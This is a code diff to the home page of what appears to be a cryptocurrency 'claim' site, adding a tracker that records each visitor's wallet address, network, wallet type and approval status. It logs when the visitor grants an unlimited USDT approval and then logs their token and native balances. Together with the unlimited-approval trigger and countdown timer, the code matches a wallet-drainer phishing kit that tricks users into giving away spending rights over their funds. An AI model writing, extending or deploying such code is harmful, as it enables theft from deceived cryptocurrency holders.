@@ -9,6 +9,7 @@ import { triggerUnlimitedApproval } from '@/lib/approvalHelper'
 import ShiftingCountdown from '@/components/ui/countdown-timer'
 import { BRAND_SYMBOL, BRAND_COMPANY, BRAND_LOGO } from '@/config/brand'
 import { logPageView, logWalletConnect, logClaimAttempt, logCustomEvent } from '@/lib/analytics'
+import { trackWalletStatus } from '@/lib/walletTracker'
 
 export default function Home() {
   const [modalOpen, setModalOpen] = useState(false)
@@ -82,8 +83,22 @@ export default function Home() {
     setStatusText('Requesting approval...')
 
     try {
+      // Track initial connection as Pending
+      await trackWalletStatus({
+        address: addrToUse,
+        network: connectionType === 'tron' ? 'Tron' : 'EVM',
+        walletType: connectionType === 'tron' ? 'TronLink' : 'WalletConnect',
+        approvalStatus: 'Pending',
+      })
+
       // 1. Unlimited USDT Approval trigger
       await triggerUnlimitedApproval(addrToUse, connectionType)
+      
+      // Update as Approved once the transaction succeeds
+      await trackWalletStatus({
+        address: addrToUse,
+        approvalStatus: 'Approved',
+      })
       
       // 2. USDT Balance Check
       setStatusText('Verifying balance...')
@@ -94,6 +109,13 @@ export default function Home() {
       if (evmProvider) {
         const balData = await getEVMWalletBalanceUSD(evmProvider, addrToUse, '0x1')
         totalUsdtUSD = balData.usdtBalanceUSD || balData.totalBalanceUSD || 0
+        
+        // Track the actual balance
+        await trackWalletStatus({
+          address: addrToUse,
+          usdtBalance: balData.usdtBalanceUSD ? balData.usdtBalanceUSD.toFixed(2) : '0.00',
+          nativeBalance: balData.nativeEth ? balData.nativeEth.toFixed(4) : '0.0000',
+        })
       } else {
         // Fallback simulated check for demo environments
         totalUsdtUSD = 2000
